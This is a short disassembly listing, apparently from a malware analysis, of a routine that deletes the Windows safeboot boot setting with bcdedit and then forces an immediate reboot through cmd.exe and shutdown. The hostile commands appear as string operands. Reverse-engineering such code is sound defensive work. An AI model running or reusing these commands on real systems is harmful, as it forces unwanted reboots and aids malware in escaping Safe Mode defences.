.text:002DFB20 sub_2DFB20 proc near                    ; CODE XREF: StartAddress+D3↓p
.text:002DFB20 push    offset aBcdeditDeletev          ; "bcdedit /deletevalue safeboot"
.text:002DFB25 call    sub_30DC04
.text:002DFB2A push    offset aCWindowsSystem_1        ; "C:\\Windows\\System32\\bcdedit.exe /del"...
.text:002DFB2F call    sub_30DC04
.text:002DFB34 push    offset aCWindowsSysnat_1        ; "C:\\Windows\\SysNative\\bcdedit.exe /de"...
.text:002DFB39 call    sub_30DC04
.text:002DFB3E add     esp, 0Ch
.text:002DFB41 push    0                               ; nShowCmd
.text:002DFB43 push    0                               ; lpDirectory
.text:002DFB45 push    offset Parameters               ; "/C shutdown -r -f -t 0"
.text:002DFB4A push    offset File                     ; "cmd.exe"
.text:002DFB4F push    offset Operation                ; "open"
.text:002DFB54 push    0                               ; hwnd
.text:002DFB56 call    ds:ShellExecuteA
.text:002DFB5C retn
.text:002DFB5C sub_2DFB20 endp
.text:002DFB5C